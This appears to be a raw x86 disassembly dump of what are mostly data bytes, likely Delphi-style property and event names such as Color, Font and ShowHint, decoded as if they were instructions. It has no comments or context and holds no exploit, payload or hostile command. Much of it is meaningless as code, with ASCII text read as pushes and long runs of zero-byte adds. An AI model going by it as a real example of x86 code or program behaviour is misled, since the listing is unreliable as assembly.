add [ eax + 0x43050011 ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] dl
inc eax
add [ ebp + 0x1 ] ch
add bh bh
add [ eax ] al
add [ 0x72440800 ] dl
imul ebp [ esi + 0x74 ] 0x44919073
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
push esp
0xea700044 0x44
add [ eax ] cl
inc ecx
jne r-xdata
cdq
inc esp
add [ eax + eax ] dh
jmp [ eax + 0x100450d ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
push eax
inc edx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c0017 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jae r-xdata
inc eax
add [ ecx ] bl
add bh bh
loopne r-xdata
outsd
insb
pushad
xor eax 0x680042
add bh bh
test al 0xe9
inc esp
add [ eax + 0x44e9 ] bh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
add bh bh
jb r-xdata
add [ ebx ] cl
push eax
popad
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax 0x72440800
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
cwde
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f500900
outsb
je r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
je r-xdata
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
std
inc ebx
add [ esi + 0x1 ] ch
add bh bh
inc ebx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
popad
jns r-xdata
je r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push 0x6948776f
outsb
outsb
je r-xdata
adc [ eax ] al
pop ecx
add [ eax ] al
jmp eax
adc [ eax ] al
0x28ff0000 0x44ea
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
jne r-xdata
adc [ eax ] al
in al 0x42
inc esp
add [ eax ] ah
inc ebx
inc esp
add [ eax + 0xff0001 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540b0020 ] al
jb r-xdata
adc [ eax ] al
jo r-xdata
inc eax
add [ ecx + 0x4ff0000 ] bl
0xe9cc0044 0x44
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jo r-xdata
add [ eax ] al
js r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
aam 0xe7
inc esp
add [ eax + 0x9 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
outsd
add [ eax ] eax
inc [ eax + 0x1004443 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jae r-xdata
push ds
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
inc ebx
push 0x10007261
inc [ ebx + eax * 2 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add bh bh
add al 0x43
fiadd [ ebp ]
jl r-xdata
add [ eax ] al
dec esp
0xd00044 0xff00
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or ecx [ edi + 0x6e ]
jo r-xdata
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ebp
inc ecx
add [ eax ] ah
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax + 0x4f0b002b ] al
dec edi
jbe r-xdata
loopne r-xdata
push eax
outsd
jo r-xdata
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
add bh bh
insb
call sub_4502bb
add [ eax ] al
inc esp
outsd
arpl [ ebx - 0x68 ] bp
pushfd
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebp
jo r-xdata
je r-xdata
inc esp
outsd
ja r-xdata
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
fwait
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
outsb
jb r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe94303dd
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0026 ] al
outsb
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x20 ] bp
pushfd
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
jb r-xdata
outsb
je r-xdata
jb r-xdata
add [ eax + 0x4f09002d ] al
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop ebp
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
push ebx
je r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
les ebx [ edx + 0xd80044 ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
[ eax ] al
pushfd
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
pop ebp
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
cmp al 0x10
inc eax
add [ eax + edx ] bh
add [ eax - 0x54 ] ch
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
in al 0x5
inc esp
inc esp
jb r-xdata
inc ebp
outsb
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : edi + ecx * 2 ] cl
pop ebp
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
popad
jbe r-xdata
dec ebp
outsd
jbe r-xdata
in al dx
je r-xdata
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax ] al
add [ eax + 0x4c004168 ] ah
jb r-xdata
inc esp
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ esp ] bl
inc eax
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
outsd
outsb
je r-xdata
mov al [ 0x449e ]
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
or al 0x4f
dec esp
0xe00044 0xff00
loopne r-xdata
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
inc esp
add ah ch
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
pop es
dec ecx
je r-xdata
inc esp
jb r-xdata
inc esp
add [ eax ] cl
push cs
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
dec esp
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
je r-xdata
jb r-xdata
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0900
add [ eax ] al
add [ eax ] al
mov al 0x8
inc esp
add [ eax ] al
je r-xdata
inc esp
add [ eax + eax ] dl
add [ eax ] al
mov al [ 0x4c004168 ]
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
add [ ebx + 0x4405e4c0 ] cl
inc eax
ja r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
popfd
inc ecx
add al bl
xchg ebx eax
inc ecx
add [ eax ] cl
mov al [ 0xffffffff9f000041 ]
pop esp
xor eax 0x35600040
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
outsd
jb r-xdata
popad
inc ebp
add [ edx + esi + 0x32d00040 ] dh
inc eax
xor eax 0x2c2c0040
imul ebp [ esi + 0x67 ] 0x7249073
inc esp
add [ edi ] al
push ss
push esp
inc ebx
jne r-xdata
add [ eax ] al
or [ edi ] al
outsb
je r-xdata
jb r-xdata
je r-xdata
jb r-xdata
je r-xdata
inc ecx
add [ eax - 0x73ffbbbb ] ch
mov [ 0x44f00041 ] al
inc esp
add [ eax * 2 - 0x5a9bffbc ] cl
inc ecx
add [ edx + ebp * 4 + 0x45840041 ] cl
inc esp
add [ eax ] ch
lodsb [ esi ]
inc ecx
add [ eax - 0x47ffbe54 ] dh
inc esi
inc esp
add [ eax - 0x52 ] ah
inc ecx
add al bh
popfd
inc ecx
add [ esi + ebx * 4 ] bl
inc ecx
add [ eax - 0x62 ] cl
inc ecx
add [ eax ] al
inc esi
inc esp
add [ eax + 0x46 ] dh
inc esp
add [ ecx - 0x5aefffbf ] ah
inc ecx
add [ eax - 0x5bffbbba ] dl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x58 ] bh
inc ecx
add ah ch
sub al [ eax ]
lodsb [ esi ]
test al 0x41
add ah bl
test al 0x41
add [ eax ] dh
test eax 0xa9dc0041
inc ecx
add [ ebx + ebp * 4 + 0x41 ] dh
add ah cl
stosd [ edi ]
inc ecx
add [ eax - 0x54 ] ah
inc ecx
add [ esi ] dl
push esp
inc ebx
jne r-xdata
inc eax
mov ah 0x32
insb
add [ 0x65646e49 ] al
js r-xdata
add [ esi ] eax
dec ecx
outsb
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
add al 0x52
je r-xdata
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
inc edi
inc esp
add ah cl
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
je r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
ja r-xdata
insd
inc ebp
jbe r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
add [ eax ] al
lahf
jb r-xdata
add al dl
xor al [ eax ]
enter 0x419d 0x0
fcom [ ebx - 0x5ff7ffbf ]
inc ecx
jb r-xdata
outsb
je r-xdata
add al ah
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax + 0x35 ] ah
inc eax
outsd
je r-xdata
jae r-xdata
dec ebp
popad
outsb
je r-xdata
inc eax
add [ ebx + 0x440688c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax ] ah
inc esp
add [ eax ] al
add [ eax ] al
push 0x3c0044ac
adc [ eax ] al
cmp al 0x10
sbb eax [ edx ]
pushad
je r-xdata
jb r-xdata
add al 0x8
pop es
inc ebx
inc ecx
add ah bl
push eax
imul ebp [ esi + 0x67 ] 0x44068873
add [ eax + 0x4169 ] cl
add [ eax ] cl
push ebx
je r-xdata
inc esp
add [ ebp + ebx * 8 + 0x10a80044 ] al
inc ebp
add [ esi + 0x22040044 ] bl
inc edx
inc ebx
je r-xdata
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add ah ch
inc esi
inc esp
add al ah
push esi
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
insb
jae r-xdata
or [ eax + eax + 0x64 ] eax
add al [ eax ]
add [ eax - 0x4d ] bh
add [ ebp + 0x7a00040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx ] dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4408 ] dh
sub_44093c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
inc esp
add [ eax + eax ] ch
add [ eax ] al
loopne r-xdata
insd
inc ebx
outsd
insd
bound ebp [ edi - 0x73 ]
inc eax
add [ ecx + ecx ] dl
inc esp
add [ edi ] al
or al 0x54
inc ebx
jne r-xdata
inc esp
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al bl
and al [ edx ]
int3
fadd [ eax + eax + 0x40 ]
and eax [ edx ]
je r-xdata
add [ eax ] bl
insd
inc ebx
outsd
insd
bound ebp [ edi - 0x60 ]
pop es
inc esp
add al cl
mov ah 0x44
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
inc ebx
je r-xdata
xlat
inc esp
add al dh
push ebx
inc esp
add [ eax - 0x29 ] bh
inc esp
add [ edi + ebp * 4 + 0x45 ] al
add al dl
or eax 0xd8f00045
inc esp
add [ edi + edx * 8 - 0x506bffbc ] ch
inc ebp
add [ eax - 0x1bffba51 ] ch
xlat
inc esp
add al dl
scasd [ edi ]
inc ebp
add [ eax - 0x28 ] al
inc esp
add [ eax ] ch
push esp
inc esp
add [ eax - 0x28 ] ah
inc esp
add al ah
scasd [ edi ]
inc ebp
add al bl
or eax 0xd9540045
inc esp
add [ ecx + ebx * 8 - 0x277fffbc ] dl
inc esp
add ah dh
scasd [ edi ]
inc ebp
add al bh
scasd [ edi ]
inc ebp
add [ eax + ebx * 8 - 0x29ebffbc ] ah
inc esp
add [ ecx ] dl
push esp
inc edx
jne r-xdata
insb
jae r-xdata
out 0x44 al
add [ edx ] al
je r-xdata
add [ eax + r-xdata ] dl
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ esp + edx * 2 + 0x56e00044 ] cl
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
inc ebp
add [ esi + 0x22040044 ] bl
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xa60c08b
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xb ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
or eax [ eax + eax + 0x4a ]
or eax [ eax + eax + 0xc ]
add al [ eax ]
add [ eax + ebp * 4 + 0x21ec0044 ] dh
inc edx
add [ eax + 0x35 ] bl
inc eax
add [ eax + 0x1b ] al
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
inc ebp
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edi + ecx ] al
inc ebp
add ah cl
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
sub_440995
fadd [ eax + eax - 0x70 ]
and al [ edx ]
and al 0x23
inc edx
add [ eax + 0x23 ] bh
inc edx
add [ edi + edx * 8 ] al
inc esp
add al dh
push ebx
inc esp
add [ eax - 0x29 ] bh
inc esp
add [ edi + ebp * 4 + 0x45 ] al
add al dl
or eax 0xd8f00045
inc esp
add [ edi + edx * 8 - 0x506bffbc ] ch
inc ebp
add [ eax - 0x1bffba51 ] ch
xlat
inc esp
add al dl
scasd [ edi ]
inc ebp
add [ eax - 0x28 ] al
inc esp
add [ eax ] ch
push esp
inc esp
add [ eax - 0x28 ] ah
inc esp
add al ah
scasd [ edi ]
inc ebp
add al bl
or eax 0xd9540045
inc esp
add [ ecx + ebx * 8 - 0x277fffbc ] dl
inc esp
add ah dh
scasd [ edi ]
inc ebp
add al bh
scasd [ edi ]
inc ebp
add [ eax + ebx * 8 - 0x29ebffbc ] ah
inc esp
add [ ecx ] dl
push esp
inc edx
jne r-xdata
out 0x44 al
add [ edx ] al
je r-xdata
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ esp + edx * 2 + 0x56e00044 ] cl
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
inc ebp
add [ esi + 0x22040044 ] bl
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xa60c08b
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xb ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
or eax [ eax + eax + 0x4a ]
or eax [ eax + eax + 0xc ]
add al [ eax ]
add [ eax + ebp * 4 + 0x21ec0044 ] dh
inc edx
add [ eax + 0x35 ] bl
inc eax
add [ eax + 0x1b ] al
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
inc ebp
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edi + ecx ] al
inc ebp
add ah cl
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
sub_440b8c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_444fa9
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x25ffbbf4 ] ch
or al 0x44
add [ eax ] bl
add al [ eax ]
add [ edx + ecx ] dl
inc esp
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
inc ebp
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edi + ecx ] al
inc ebp
add ah cl
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
sub_441ba0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x1c
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2dffbbe4 ] bh
sbb al 0x44
add [ edx + eax ] dl
add [ eax ] al
adc al 0xa
inc esp
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
inc ebp
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edi + ecx ] al
inc ebp
add ah cl
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
sub_441bf1
xchg edx eax
inc ecx
add [ eax - 0x7bffbaf7 ] cl
fld [ eax + eax - 0x58 ]
adc [ ebp ] al
pushfd
out 0x44 al
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax - 0x1fffbba4 ] al
push esi
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
sub_441c5c
pop eax
push ebp
inc esp
add [ eax ] cl
or al 0x45
add al ch
dec esi
inc ebp
add [ edi + ecx * 2 + 0x4aa00045 ] ah
inc ebp
add [ eax + 0x2000454f ] cl
adc [ ebp ] eax
mov ah 0x17
inc ebp
add [ ebp + 0x45 ] dl
add [ eax + 0x5e ] dh
inc esp
add [ edx ] bh
inc ebp
add al cl
pop esi
inc esp
add ah ch
and eax 0x25f00045
inc ebp
add [ eax + 0x50004524 ] ch
and al 0x45
add al cl
push eax
inc ebp
add [ eax - 0x43ffbad2 ] bl
bound eax [ ebp ]
inc esp
dec ebp
inc ebp
add [ eax + edx * 2 ] dh
inc ebp
add al ah
pop esp
inc esp
add ah ah
pop ebp
inc esp
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0xf4ff
sub_441dbf
xor al 0x55
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
pop es
inc ebx
push 0x656b6365
shl [ fs : eax ] 0x42
add [ eax ] dh
add bh bh
push esp
0xea700044 0x44
sub_441de5
add [ eax ] al
add [ eax - 0xfffffb ] al
adc [ eax ] eax
add eax 0x6f6c6f43
jb r-xdata
push cs
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7865646f
cwde
inc esp
add [ eax + ebp * 8 - 0x171bffbc ] dh
inc esp
add al cl
or [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sldt [ edi ]
inc ebx
popad
jo r-xdata
cdq
inc esp
add [ eax + eax ] dh
jmp [ eax + 0x100450d ]
push ecx
inc ebp
add [ eax ] bl
push edx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
add [ gs : eax ] dl
xor eax [ eax + edx * 4 - 0x6f ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
[ eax - 0x47ffbb17 ]
jae r-xdata
add bh bh
test al 0xe9
inc esp
add [ eax + 0x44e9 ] bh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ss
add [ eax ] cl
inc esp
jb r-xdata
cwde
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
push eax
popad
jb r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec ebp
outsd
add [ gs : eax ] dl
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
or dl [ eax + 0x61 ]
jb r-xdata
outsb
je r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
insb
push esi
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cwde
inc esp
add [ eax + 0x52 ] dl
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
je r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
jb r-xdata
aam 0xe7
inc esp
jo r-xdata
adc [ eax ] al
0x28ff0000 0x44ea
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500e00
jb r-xdata
push cs
push eax
popad
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jo r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
outsb
je r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
loopne r-xdata
dec ebx
jns r-xdata
call 0xffffffffc04462df
add [ eax ] eax
pop ebp
inc ecx
add al al
jo r-xdata
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ebp
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
cdq
add [ eax ] al
inc [ edx + ebp * 8 ]
inc esp
add ah cl
jmp r-xdata
inc ebp
add al dl
push edx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push edx
push 0x6948776f
outsb
je r-xdata
add [ ebx ] cl
push eax
popad
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
push eax
outsd
jo r-xdata
fwait
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] eax
pop es
push esp
popad
